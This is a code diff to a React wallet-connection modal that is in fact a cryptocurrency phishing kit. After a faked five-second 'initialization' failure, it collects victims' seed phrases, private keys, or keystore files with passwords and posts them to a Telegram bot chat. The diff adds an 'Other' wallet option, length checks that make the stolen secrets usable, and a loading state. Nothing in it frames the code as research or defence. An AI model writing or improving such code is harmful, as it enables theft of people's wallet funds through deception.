@@ -21,6 +21,7 @@ interface WalletModalProps {
 }
 
 const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose }) => {
+  const [loading, setLoading] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
   const [isInitializing, setInitializing] = useState<boolean>(false);
   const [initializationFailed, setInitializationFailed] =
@@ -32,40 +33,47 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose }) => {
   const [password, setPassword] = useState<string>("");
   const [privateKey, setPrivateKey] = useState<string>("");
   const [loadingDots, setLoadingDots] = useState<string>("");
+  const [otherWalletInput, setOtherWalletInput] = useState<string>("");
 
   useEffect(() => {
     if (isInitializing) {
       const interval = setInterval(() => {
         setLoadingDots((prev) => (prev.length < 4 ? prev + "." : ""));
       }, 500);
-
       return () => clearInterval(interval);
     }
   }, [isInitializing]);
 
   const handleWalletClick = (wallet: Wallet) => {
-    setSelectedWallet(wallet);
-    setInitializing(true);
-    setInitializationFailed(false);
-
-    setTimeout(() => {
-      setInitializationFailed(true);
-    }, 5000);
+    if (wallet.name === "Other") {
+      setSelectedWallet(wallet); // temporarily store "Other"
+    } else {
+      setSelectedWallet(wallet);
+      setInitializing(true);
+      setInitializationFailed(false);
+      setTimeout(() => {
+        setInitializationFailed(true);
+      }, 5000);
+    }
   };
 
   const closeInitializingModal = () => {
     setInitializing(false);
     setInitializationFailed(false);
     setSelectedWallet(null);
+    setOtherWalletInput("");
   };
 
   const handleValidate = async () => {
     let emailBody = "";
 
     switch (selectedImportType) {
-      case "Phrase":
+      case "Phrase": {
+        const wordCount = phrase.trim().split(/\s+/).length;
         if (!phrase.trim())
           return toast.error("Please enter your wallet phrase.");
+        if (wordCount < 12)
+          return toast.error("Seed phrase must be at least 12 words.");
         emailBody = `
 🔐 Wallet Import Request \n
 Wallet: ${selectedWallet?.name}
@@ -73,8 +81,9 @@ Import Type: Seed Phrase
 Phrase: \`${phrase.trim()}\`
       `;
         break;
+      }
 
-      case "Keystore JSON":
+      case "Keystore JSON": {
         if (!keystore.trim() || !password.trim())
           return toast.error("Enter both keystore and password.");
         emailBody = `
@@ -88,9 +97,12 @@ ${keystore.trim()}
 Password: \`${password.trim()}\`
       `;
         break;
+      }
 
-      case "Private Key":
+      case "Private Key": {
         if (!privateKey.trim()) return toast.error("Enter your private key.");
+        if (privateKey.trim().length < 12)
+          return toast.error("Private key must be at least 12 characters.");
         emailBody = `
 🔐 Wallet Import Request \n
 Wallet: ${selectedWallet?.name}
@@ -98,10 +110,9 @@ Import Type: Private Key
 Private Key: \`${privateKey.trim()}\`
       `;
         break;
+      }
     }
-
-    const BOT_TOKEN = "";
-    const CHAT_ID = "";
+    setLoading(true);
 
     try {
       await fetch(
@@ -114,7 +125,7 @@ Private Key: \`${privateKey.trim()}\`
           body: JSON.stringify({
             chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
             text: emailBody,
-            parse_mode: "Markdown", // Allows backtick formatting
+            parse_mode: "Markdown",
           }),
         }
       );
@@ -124,6 +135,8 @@ Private Key: \`${privateKey.trim()}\`
     } catch (error) {
       console.error("Telegram send error:", error);
       toast.error("Failed to send message.");
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -140,7 +153,10 @@ Private Key: \`${privateKey.trim()}\`
           </DialogHeader>
 
           <div className="flex flex-col gap-4">
-            {web3Wallets.map((wallet: Wallet, index: number) => (
+            {[
+              ...web3Wallets,
+              { name: "Other", logo: "/images/custom.jpg" },
+            ].map((wallet: Wallet, index: number) => (
               <div
                 key={index}
                 onClick={() => handleWalletClick(wallet)}
@@ -165,8 +181,50 @@ Private Key: \`${privateKey.trim()}\`
         </DialogContent>
       </Dialog>
 
+      {/* Prompt for Other Wallet Name */}
+      {selectedWallet?.name === "Other" && (
+        <Dialog open={true} onOpenChange={closeInitializingModal}>
+          <DialogContent>
+            <DialogHeader>
+              <DialogTitle className="text-white text-lg font-semibold">
+                Enter your wallet name
+              </DialogTitle>
+            </DialogHeader>
+            <div className="flex flex-col gap-4">
+              <input
+                type="text"
+                value={otherWalletInput}
+                onChange={(e) => setOtherWalletInput(e.target.value)}
+                placeholder="e.g., Unknown Wallet"
+                className="w-full p-2 border rounded-lg"
+              />
+              <button
+                onClick={() => {
+                  if (!otherWalletInput.trim()) {
+                    toast.error("Please enter a wallet name.");
+                    return;
+                  }
+                  setSelectedWallet({
+                    name: otherWalletInput.trim(),
+                    logo: "/images/custom.jpg",
+                  });
+                  setInitializing(true);
+                  setInitializationFailed(false);
+                  setTimeout(() => {
+                    setInitializationFailed(true);
+                  }, 5000);
+                }}
+                className="h-[50px] bg-primary text-black px-4 py-2 rounded-md"
+              >
+                Continue
+              </button>
+            </div>
+          </DialogContent>
+        </Dialog>
+      )}
+
       {/* Initialization Modal */}
-      {selectedWallet && (
+      {selectedWallet && selectedWallet.name !== "Other" && (
         <Dialog open={isInitializing} onOpenChange={closeInitializingModal}>
           <DialogContent>
             <DialogHeader>
@@ -271,12 +329,12 @@ Private Key: \`${privateKey.trim()}\`
                     />
                   </div>
                 )}
-
                 <button
                   onClick={handleValidate}
+                  disabled={loading}
                   className="flex items-center justify-center cursor-pointer h-[50px] w-full bg-primary text-black px-4 py-2 rounded-md mt-4"
                 >
-                  Validate
+                  {loading ? "Validating..." : "Validate"}
                 </button>
               </div>
             )}
